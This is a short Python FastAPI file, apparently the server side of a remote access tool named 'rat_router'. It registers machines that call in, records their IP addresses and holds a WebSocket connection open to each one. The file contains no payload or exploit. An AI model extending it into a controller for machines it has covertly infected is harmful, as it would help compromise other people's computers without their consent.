from fastapi import WebSocket, APIRouter, Request, WebSocketDisconnect

import machines
import con
from uid import Uid, gen_uid

rat_router = APIRouter()

@rat_router.get("/api/{version}/register")
async def register_machine(version: int, request: Request) -> Uid:
	id = gen_uid()
	machines.all[id] = machines.Machine(id=id, version=version)
	await machines.all[id].on_register(request.client.host)
	print("Registered: ", id)
	return id

@rat_router.websocket("/ws/{version}/{machine_id}")
async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine_id: Uid):
	await websocket.accept()
	try:
		print(f"Machine {machine_id} connected")
		con.active_machines[machine_id] = websocket
		await machines.all[machine_id].on_connect(websocket.client.host)
		while True:
			data = await websocket.receive_json()
	except WebSocketDisconnect:
		print(f"Machine {machine_id} left")
	finally:
		await machines.all[machine_id].on_disconnect(websocket.client.host)